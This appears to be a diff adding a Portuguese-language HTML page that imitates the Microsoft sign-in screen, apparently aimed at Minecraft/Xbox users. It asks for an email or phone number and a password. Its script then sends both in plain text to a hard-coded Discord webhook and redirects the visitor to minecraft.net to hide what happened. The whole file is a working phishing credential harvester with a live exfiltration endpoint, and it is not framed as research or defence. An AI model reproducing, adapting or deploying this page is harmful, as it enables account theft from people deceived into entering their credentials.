@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Microsoft</title>
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background-image: url('fundo.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .wrapper {
+      background-color: #2a2a2a;
+      border-radius: 12px;
+      padding: 40px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
+      color: white;
+      text-align: center;
+    }
+
+    .logo-com-texto {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+
+    .logo-com-texto img {
+      height: 40px;
+      margin-bottom: 8px;
+    }
+
+    .logo-com-texto span {
+      font-size: 20px;
+      font-weight: 500;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 5px;
+    }
+
+    p {
+      margin-bottom: 25px;
+      color: #ccc;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      background-color: transparent;
+      color: #fff;
+      border: 1px solid #3c3c3c;
+      border-radius: 4px;
+      margin-bottom: 12px;
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    .link {
+      color: #107C10;
+      font-size: 14px;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 20px;
+      transition: all 0.3s ease;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    .botao {
+      width: 100%;
+      padding: 12px;
+      background-color: #107C10;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .botao:hover {
+      background-color: #0e6e0f;
+    }
+
+    .mensagem-erro {
+      margin-top: 10px;
+      color: red;
+      font-size: 14px;
+    }
+
+    .criar-conta {
+      margin-top: 25px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    .criar-conta a {
+      color: #107C10;
+      text-decoration: none;
+      transition: all 0.3s ease;
+    }
+
+    .criar-conta a:hover {
+      text-decoration: underline;
+    }
+
+    #senha-section {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="wrapper">
+    <div class="logo-com-texto">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+      <span>Microsoft</span>
+    </div>
+
+    <h2>Entrar</h2>
+    <p>para continuar a Microsoft.</p>
+
+    <div id="formulario">
+      <input type="text" id="usuario" placeholder="Email ou número de telefone">
+
+      <a class="link" href="https://account.live.com/username/recover" target="_blank">
+        Esqueceu seu nome de usuário?
+      </a>
+
+      <div id="senha-section">
+        <input type="password" id="senha" placeholder="Senha">
+      </div>
+
+      <button class="botao" id="botaoLogin" onclick="proximoPasso()">Avançar</button>
+
+      <div class="mensagem-erro" id="mensagemErro"></div>
+
+      <div class="criar-conta">
+        Novo na Microsoft?
+        <a href="https://login.live.com/oauth20_authorize.srf?redirect_uri=https%3a%2f%2fsisu.xboxlive.com%2fconnect%2foauth%2fXboxLive&response_type=code&client_id=000000004420578E&scope=XboxLive.Signin%20+XboxLive.offline_access" target="_blank">
+          Criar uma conta
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let etapa = 1;
+
+    function proximoPasso() {
+      const usuario = document.getElementById('usuario').value.trim();
+      const senha = document.getElementById('senha')?.value.trim();
+      const mensagemErro = document.getElementById('mensagemErro');
+      const senhaSection = document.getElementById('senha-section');
+      const botao = document.getElementById('botaoLogin');
+
+      const regexEmail = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+      const regexTelefone = /^\d{10,11}$/;
+      const regexSenha = /^.{4,}$/;
+
+      if (etapa === 1) {
+        if (!regexEmail.test(usuario) && !regexTelefone.test(usuario)) {
+          mensagemErro.textContent = 'Informe um telefone válido ou e-mail @gmail.com.';
+          return;
+        }
+
+        senhaSection.style.display = 'block';
+        botao.textContent = 'Entrar';
+        mensagemErro.textContent = '';
+        etapa = 2;
+      } else {
+        if (!regexSenha.test(senha)) {
+          mensagemErro.textContent = 'Digite uma senha válida.';
+          return;
+        }
+
+        mensagemErro.style.color = 'green';
+        mensagemErro.textContent = 'Enviando...';
+
+        const payload = {
+          content: `📧 Login:\nUsuário: ${usuario}\n🔐 Senha: ${senha}`
+        };
+
+        fetch('https://discord.com/api/webhooks/1404632055358160916/fIanxa33hMkxRHAkxJ7QhbBKzWmGHWAClBhjvTgqlBvPZq266lf97_kx_IGnlIOPn7Vl', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(res => {
+          if (res.ok) {
+            window.location.href = 'https://www.minecraft.net/pt-br';
+          } else {
+            mensagemErro.style.color = 'red';
+            mensagemErro.textContent = 'Erro ao enviar.';
+          }
+        })
+        .catch(() => {
+          mensagemErro.style.color = 'red';
+          mensagemErro.textContent = 'Erro de rede.';
+        });
+
+        // Garantir redirecionamento mesmo sem fetch
+        setTimeout(() => {
+          window.location.href = 'https://www.minecraft.net/pt-br';
+        }, 1000);
+      }
+    }
+  </script>
+
+</body>
+</html>
